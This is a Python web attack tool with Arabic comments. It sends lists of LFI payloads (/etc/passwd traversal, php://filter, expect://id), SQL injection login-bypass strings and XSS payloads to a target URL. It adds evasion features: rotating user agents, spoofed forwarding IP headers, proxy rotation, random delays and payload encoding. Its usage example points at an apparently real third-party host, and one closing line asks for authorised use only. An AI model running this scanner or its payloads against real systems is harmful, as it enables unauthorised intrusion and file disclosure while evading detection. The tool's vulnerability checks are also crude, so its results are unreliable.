#!/usr/bin/env python3
# Advanced Stealth Scanner - Lua Style Implementation in Python
# فاحص ثغرات متقدم بلغة Python بتصميم يحاكي Lua

import requests
import random
import time
import json
import os
import base64
import urllib.parse
from datetime import datetime
import re

class LuaStyleStealthScanner:
    """فاحص ثغرات متقدم مع ميزات التخفي بلغة Python بتصميم Lua"""
    
    def __init__(self):
        # تعطيل تحذيرات SSL
        requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)
        
        # قائمة وكلاء المستخدم المتقدمين
        self.USER_AGENTS = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:89.0) Gecko/20100101 Firefox/89.0",
            "Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/91.0.864.59",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15"
        ]
        
        # قائمة البروكسيات
        self.PROXIES = [
            {"http": "http://proxy1.example.com:8080", "https": "http://proxy1.example.com:8080"},
            {"http": "http://proxy2.example.com:8080", "https": "http://proxy2.example.com:8080"}
        ]
        
        # حمولات LFI المتقدمة
        self.LFI_PAYLOADS = [
            "../../../../etc/passwd",
            "../../../etc/passwd%00",
            "....//....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "%252e%252e%252f%252e%252e%252fetc%252fpasswd",
            "%u2215%u0065%u0074%u0063%u2215%u0070%u0061%u0073%u0073%u0077%u0064",
            "Li4vLi4vLi4vLi4vZXRjL3Bhc3N3ZA==",
            "php://filter/convert.base64-encode/resource=/etc/passwd",
            "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==",
            "expect://id",
            "file:///etc/passwd",
            "....//....//....//etc/passwd",
            "..%2f..%2f..%2f..%2fetc%2fpasswd",
            "%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd"
        ]
        
        # حمولات SQL Injection
        self.SQL_PAYLOADS = [
            "' OR '1'='1",
            "' OR 1=1--",
            "' UNION SELECT null,null,null--",
            "admin'--",
            "admin' #",
            "admin'/*",
            "' or 1=1#",
            "' or 1=1--",
            "' or 1=1/*",
            "') or '1'='1--",
            "') or ('1'='1--",
            "1' OR '1'='1",
            "1' OR 1 -- -",
            "1' OR 1=1--",
            "1' UNION SELECT 1,2,3--",
            "1' AND (SELECT COUNT(*) FROM users) > 0--"
        ]
        
        # حمولات XSS
        self.XSS_PAYLOADS = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<iframe src=javascript:alert('XSS')>",
            "<body onload=alert('XSS')>",
            "<input onfocus=alert('XSS') autofocus>",
            "<select onfocus=alert('XSS') autofocus>",
            "<textarea onfocus=alert('XSS') autofocus>",
            "<button onclick=alert('XSS')>Click</button>"
        ]

    def generate_random_headers(self, stealth_level):
        """إنشاء هيدرات عشوائية متقدمة"""
        headers = {}
        
        # User-Agent عشوائي
        headers["User-Agent"] = random.choice(self.USER_AGENTS)
        
        if stealth_level >= 2:
            headers["Accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8"
            headers["Accept-Language"] = "en-US,en;q=0.5"
            headers["Accept-Encoding"] = "gzip, deflate"
            headers["DNT"] = "1"
            headers["Connection"] = "keep-alive"
            headers["Upgrade-Insecure-Requests"] = "1"
        
        if stealth_level >= 3:
            headers["X-Forwarded-For"] = f"192.168.1.{random.randint(1, 255)}"
            headers["X-Real-IP"] = f"10.0.0.{random.randint(1, 255)}"
            headers["X-Forwarded-Proto"] = "https"
            headers["X-Forwarded-Host"] = "localhost"
            headers["Referer"] = f"https://www.google.com/search?q={random.randint(1000, 9999)}"
        
        if stealth_level >= 4:
            headers["Cache-Control"] = "no-cache, no-store, must-revalidate"
            headers["Pragma"] = "no-cache"
            headers["Expires"] = "0"
            headers["X-Frame-Options"] = "SAMEORIGIN"
            headers["X-Content-Type-Options"] = "nosniff"
        
        if stealth_level >= 5:
            headers["X-Random-Header"] = str(random.randint(1000000, 9999999))
            headers["X-Timestamp"] = str(int(time.time()))
            headers["X-Session-ID"] = f"{random.randint(0, 0xffffffff):08x}-{random.randint(0, 0xffff):04x}-{random.randint(0, 0xffff):04x}-{random.randint(0, 0xffff):04x}-{random.randint(0, 0xffffffffffff):012x}"
        
        return headers

    def random_delay(self, min_seconds, max_seconds):
        """إضافة تأخير عشوائي"""
        delay = random.uniform(min_seconds, max_seconds)
        print(f"⏱️  إضافة تأخير: {delay:.2f} ثانية")
        time.sleep(delay)

    def encode_payload(self, payload, stealth_level):
        """ترميع الحمولة حسب مستوى التخفي"""
        if stealth_level <= 2:
            return payload
        
        if stealth_level == 3:
            return urllib.parse.quote(payload)
        
        if stealth_level >= 4:
            encoded = payload
            encoded = encoded.replace("..", "....")
            encoded = encoded.replace("/", "%2f")
            encoded = encoded.replace(" ", "%20")
            return encoded
        
        return payload

    def stealth_request(self, url, method="GET", data=None, headers=None, proxy=None, timeout=30):
        """إنشاء طلب HTTP مع ميزات التخفي"""
        try:
            response = requests.request(
                method=method,
                url=url,
                headers=headers,
                data=data,
                proxies=proxy,
                timeout=timeout,
                verify=False,
                allow_redirects=True
            )
            
            return {
                "success": True,
                "status_code": response.status_code,
                "headers": dict(response.headers),
                "body": response.text,
                "response_time": response.elapsed.total_seconds()
            }
        except Exception as e:
            return {
                "success": False,
                "error": str(e),
                "status_code": 0,
                "body": ""
            }

    def test_lfi_stealth(self, target_url, stealth_level):
        """اختبار LFI مع التخفي"""
        print(f"🔍 اختبار LFI المتقدم (مستوى التخفي: {stealth_level})")
        
        results = []
        found_vulnerabilities = []
        
        for i, payload in enumerate(self.LFI_PAYLOADS, 1):
            print(f"\n📡 اختبار الحمولة رقم {i}/{len(self.LFI_PAYLOADS)}")
            
            # ترميع الحمولة
            encoded_payload = self.encode_payload(payload, stealth_level)
            test_url = f"{target_url}?file={encoded_payload}"
            
            # إنشاء هيدرات عشوائية
            headers = self.generate_random_headers(stealth_level)
            
            # اختيار بروكسي عشوائي
            proxy = None
            if stealth_level >= 3 and self.PROXIES:
                proxy = random.choice(self.PROXIES)
            
            # تأخير عشوائي
            self.random_delay(0.5, 3.0)
            
            # تنفيذ الطلب
            response = self.stealth_request(test_url, "GET", headers=headers, proxy=proxy)
            
            if response["success"]:
                # فحص مؤشرات الاستغلال
                is_vulnerable = False
                vulnerability_type = None
                
                # فحص ملف /etc/passwd
                if "root:" in response["body"] and re.search(r":\d+:\d+:", response["body"]):
                    is_vulnerable = True
                    vulnerability_type = "LFI - Unix Password File"
                
                # فحص ملف windows\win.ini
                if "[windows]" in response["body"]:
                    is_vulnerable = True
                    vulnerability_type = "LFI - Windows Configuration"
                
                # فحص PHP Wrapper
                if "phpinfo" in response["body"]:
                    is_vulnerable = True
                    vulnerability_type = "LFI - PHP Wrapper"
                
                if is_vulnerable:
                    print(f"🚨 ثغرة LFI تم اكتشافها! ({vulnerability_type})")
                    found_vulnerabilities.append({
                        "payload": payload,
                        "encoded_payload": encoded_payload,
                        "url": test_url,
                        "type": vulnerability_type,
                        "response_length": len(response["body"]),
                        "status_code": response["status_code"]
                    })
                else:
                    print(f"✅ لم يتم اكتشاف ثغرات بالحمولة: {payload[:50]}")
                
                results.append({
                    "payload": payload,
                    "encoded_payload": encoded_payload,
                    "url": test_url,
                    "status_code": response["status_code"],
                    "response_length": len(response["body"]),
                    "is_vulnerable": is_vulnerable,
                    "vulnerability_type": vulnerability_type
                })
            else:
                print(f"❌ فشل الطلب: {response.get('error', 'Unknown error')}")
        
        return {
            "total_tests": len(results),
            "found_vulnerabilities": found_vulnerabilities,
            "all_results": results
        }

    def test_sql_injection_stealth(self, target_url, stealth_level):
        """اختبار SQL Injection مع التخفي"""
        print(f"🔍 اختبار SQL Injection المتقدم (مستوى التخفي: {stealth_level})")
        
        results = []
        found_vulnerabilities = []
        
        for i, payload in enumerate(self.SQL_PAYLOADS, 1):
            print(f"\n📡 اختبار الحمولة رقم {i}/{len(self.SQL_PAYLOADS)}")
            
            # ترميع الحمولة
            encoded_payload = self.encode_payload(payload, stealth_level)
            test_url = f"{target_url}?id={encoded_payload}"
            
            # إنشاء هيدرات عشوائية
            headers = self.generate_random_headers(stealth_level)
            
            # تأخير عشوائي
            self.random_delay(0.5, 2.0)
            
            # تنفيذ الطلب
            response = self.stealth_request(test_url, "GET", headers=headers)
            
            if response["success"]:
                # فحص مؤشرات SQL Injection
                is_vulnerable = False
                vulnerability_type = None
                
                # فحص أخطاء قاعدة البيانات
                response_body_lower = response["body"].lower()
                if any(db_error in response_body_lower for db_error in ["mysql", "postgresql", "sqlite", "oracle"]):
                    is_vulnerable = True
                    vulnerability_type = "SQL Injection - Database Error"
                
                # فحص نتائج UNION
                if "union" in response_body_lower or "select" in response_body_lower:
                    is_vulnerable = True
                    vulnerability_type = "SQL Injection - UNION Attack"
                
                if is_vulnerable:
                    print(f"🚨 ثغرة SQL Injection تم اكتشافها! ({vulnerability_type})")
                    found_vulnerabilities.append({
                        "payload": payload,
                        "encoded_payload": encoded_payload,
                        "url": test_url,
                        "type": vulnerability_type,
                        "response_length": len(response["body"]),
                        "status_code": response["status_code"]
                    })
                else:
                    print(f"✅ لم يتم اكتشاف ثغرات بالحمولة: {payload[:30]}")
                
                results.append({
                    "payload": payload,
                    "encoded_payload": encoded_payload,
                    "url": test_url,
                    "status_code": response["status_code"],
                    "response_length": len(response["body"]),
                    "is_vulnerable": is_vulnerable,
                    "vulnerability_type": vulnerability_type
                })
            else:
                print(f"❌ فشل الطلب: {response.get('error', 'Unknown error')}")
        
        return {
            "total_tests": len(results),
            "found_vulnerabilities": found_vulnerabilities,
            "all_results": results
        }

    def test_xss_stealth(self, target_url, stealth_level):
        """اختبار XSS مع التخفي"""
        print(f"🔍 اختبار XSS المتقدم (مستوى التخفي: {stealth_level})")
        
        results = []
        found_vulnerabilities = []
        
        for i, payload in enumerate(self.XSS_PAYLOADS, 1):
            print(f"\n📡 اختبار الحمولة رقم {i}/{len(self.XSS_PAYLOADS)}")
            
            # ترميع الحمولة
            encoded_payload = self.encode_payload(payload, stealth_level)
            test_url = f"{target_url}?input={encoded_payload}"
            
            # إنشاء هيدرات عشوائية
            headers = self.generate_random_headers(stealth_level)
            
            # تأخير عشوائي
            self.random_delay(0.5, 2.0)
            
            # تنفيذ الطلب
            response = self.stealth_request(test_url, "GET", headers=headers)
            
            if response["success"]:
                # فحص مؤشرات XSS
                is_vulnerable = False
                vulnerability_type = None
                
                # فحص تنفيذ السكربت
                if "alert('XSS')" in response["body"] or 'alert("XSS")' in response["body"]:
                    is_vulnerable = True
                    vulnerability_type = "XSS - Script Execution"
                
                # فحص تضمين HTML
                if "<script>" in response["body"] or "<iframe" in response["body"]:
                    is_vulnerable = True
                    vulnerability_type = "XSS - HTML Injection"
                
                if is_vulnerable:
                    print(f"🚨 ثغرة XSS تم اكتشافها! ({vulnerability_type})")
                    found_vulnerabilities.append({
                        "payload": payload,
                        "encoded_payload": encoded_payload,
                        "url": test_url,
                        "type": vulnerability_type,
                        "response_length": len(response["body"]),
                        "status_code": response["status_code"]
                    })
                else:
                    print(f"✅ لم يتم اكتشاف ثغرات بالحمولة: {payload[:30]}")
                
                results.append({
                    "payload": payload,
                    "encoded_payload": encoded_payload,
                    "url": test_url,
                    "status_code": response["status_code"],
                    "response_length": len(response["body"]),
                    "is_vulnerable": is_vulnerable,
                    "vulnerability_type": vulnerability_type
                })
            else:
                print(f"❌ فشل الطلب: {response.get('error', 'Unknown error')}")
        
        return {
            "total_tests": len(results),
            "found_vulnerabilities": found_vulnerabilities,
            "all_results": results
        }

    def save_results(self, results, filename):
        """حفظ النتائج في ملف"""
        try:
            with open(filename, 'w', encoding='utf-8') as f:
                f.write("Advanced Stealth Security Scan Results (Lua Style)\n")
                f.write("==================================================\n\n")
                
                f.write(f"تاريخ الفحص: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write(f"إجمالي الاختبارات: {results['total_tests']}\n")
                f.write(f"الثغرات المكتشفة: {len(results['found_vulnerabilities'])}\n\n")
                
                if results['found_vulnerabilities']:
                    f.write("الثغرات المكتشفة:\n")
                    f.write("-----------------\n\n")
                    
                    for i, vuln in enumerate(results['found_vulnerabilities'], 1):
                        f.write(f"{i}. نوع الثغرة: {vuln['type']}\n")
                        f.write(f"   الحمولة: {vuln['payload']}\n")
                        f.write(f"   الحمولة المرمعة: {vuln['encoded_payload']}\n")
                        f.write(f"   الرابط: {vuln['url']}\n")
                        f.write(f"   كود الاستجابة: {vuln['status_code']}\n")
                        f.write(f"   طول الاستجابة: {vuln['response_length']} بايت\n\n")
                
                f.write("\nجميع نتائج الاختبار:\n")
                f.write("-------------------\n\n")
                
                for i, result in enumerate(results['all_results'], 1):
                    f.write(f"{i}. الحمولة: {result['payload']}\n")
                    f.write(f"   الحالة: {'مكتشف' if result['is_vulnerable'] else 'آمن'}\n")
                    if result['is_vulnerable']:
                        f.write(f"   نوع الثغرة: {result['vulnerability_type']}\n")
                    f.write(f"   كود الاستجابة: {result['status_code']}\n")
                    f.write(f"   طول الاستجابة: {result['response_length']} بايت\n\n")
            
            print(f"💾 تم حفظ النتائج في: {filename}")
        except Exception as e:
            print(f"❌ فشل حفظ الملف: {e}")

def main():
    """الدالة الرئيسية"""
    print("🛡️  Lua Style Advanced Stealth Scanner")
    print("========================================")
    print("فاحص ثغرات متقدم بلغة Python بتصميم يحاكي Lua")
    print("")
    
    import sys
    
    if len(sys.argv) < 3:
        print("الاستخدام: python lua_style_stealth_scanner.py <target_url> <stealth_level> [scan_type]")
        print("  target_url: الرابط المستهدف (مثال: https://dxp.salam.sa/test.php)")
        print("  stealth_level: مستوى التخفي (1-5)")
        print("  scan_type: نوع الفحص (all, lfi, sql, xss) - اختياري، الافتراضي: all")
        print("")
        print("مثال: python lua_style_stealth_scanner.py https://dxp.salam.sa/test.php 5 all")
        return
    
    target_url = sys.argv[1]
    stealth_level = int(sys.argv[2])
    scan_type = sys.argv[3] if len(sys.argv) > 3 else "all"
    
    if stealth_level < 1 or stealth_level > 5:
        print("❌ مستوى التخفي يجب أن يكون بين 1 و 5")
        return
    
    print(f"🎯 الهدف: {target_url}")
    print(f"🔒 مستوى التخفي: {stealth_level}")
    print(f"🔍 نوع الفحص: {scan_type}")
    print("")
    
    # إنشاء الفاحص
    scanner = LuaStyleStealthScanner()
    
    # بدء الفحص
    start_time = time.time()
    all_results = {}
    
    if scan_type in ["all", "lfi"]:
        print("🚀 بدء فحص LFI...")
        lfi_results = scanner.test_lfi_stealth(target_url, stealth_level)
        all_results["lfi"] = lfi_results
        
        if lfi_results["found_vulnerabilities"]:
            scanner.save_results(lfi_results, "lua_style_lfi_results.txt")
        print("")
    
    if scan_type in ["all", "sql"]:
        print("🚀 بدء فحص SQL Injection...")
        sql_results = scanner.test_sql_injection_stealth(target_url, stealth_level)
        all_results["sql"] = sql_results
        
        if sql_results["found_vulnerabilities"]:
            scanner.save_results(sql_results, "lua_style_sql_results.txt")
        print("")
    
    if scan_type in ["all", "xss"]:
        print("🚀 بدء فحص XSS...")
        xss_results = scanner.test_xss_stealth(target_url, stealth_level)
        all_results["xss"] = xss_results
        
        if xss_results["found_vulnerabilities"]:
            scanner.save_results(xss_results, "lua_style_xss_results.txt")
        print("")
    
    # ملخص النتائج
    end_time = time.time()
    total_time = end_time - start_time
    
    print("📊 ملخص الفحص:")
    print("================")
    print(f"⏱️  وقت الفحص الكلي: {total_time:.2f} ثانية")
    
    total_vulnerabilities = 0
    if "lfi" in all_results and all_results["lfi"]["found_vulnerabilities"]:
        print(f"🔓 ثغرات LFI المكتشفة: {len(all_results['lfi']['found_vulnerabilities'])}")
        total_vulnerabilities += len(all_results["lfi"]["found_vulnerabilities"])
    
    if "sql" in all_results and all_results["sql"]["found_vulnerabilities"]:
        print(f"🔓 ثغرات SQL المكتشفة: {len(all_results['sql']['found_vulnerabilities'])}")
        total_vulnerabilities += len(all_results["sql"]["found_vulnerabilities"])
    
    if "xss" in all_results and all_results["xss"]["found_vulnerabilities"]:
        print(f"🔓 ثغرات XSS المكتشفة: {len(all_results['xss']['found_vulnerabilities'])}")
        total_vulnerabilities += len(all_results["xss"]["found_vulnerabilities"])
    
    print(f"🔒 إجمالي الثغرات المكتشفة: {total_vulnerabilities}")
    
    if total_vulnerabilities > 0:
        print("")
        print("⚠️  تم اكتشاف ثغرات أمنية! تحقق من ملفات النتائج للحصول على التفاصيل.")
    else:
        print("")
        print("✅ لم يتم اكتشاف ثغرات أمنية واضحة.")
    
    print("")
    print("🔒 تذكر: استخدم هذه الأدوات فقط للاختبار الأمني المصرح به.")

if __name__ == "__main__":
    main()